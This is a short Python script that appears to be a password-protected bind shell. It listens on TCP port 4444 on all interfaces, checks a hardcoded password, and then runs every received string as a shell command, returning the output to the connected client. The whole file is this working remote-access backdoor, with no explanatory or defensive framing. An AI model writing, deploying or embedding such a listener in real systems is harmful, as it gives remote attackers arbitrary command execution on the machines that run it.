import socket
import subprocess

HOST = ""
PORT = 4444
PASSWORD = "iloveboosters"

server = socket.socket()
server.bind((HOST, PORT))
server.listen(1)

print("Server Started")
print("Waiting for connection...")

client, addr = server.accept()
print("Connected:", addr)

pw = client.recv(1024).decode().strip()

if pw != PASSWORD:
    print("Bad password")
    client.close()
    server.close()
    quit()

print("Login Success")

while True:
    command = client.recv(1024).decode().strip()

    if command == "exit":
        break

    result = subprocess.run(command, shell=True, capture_output=True, text=True)

    output = result.stdout + result.stderr

    if output == "":
        output = "no stdout"

    client.send(output.encode())

client.close()
server.close()
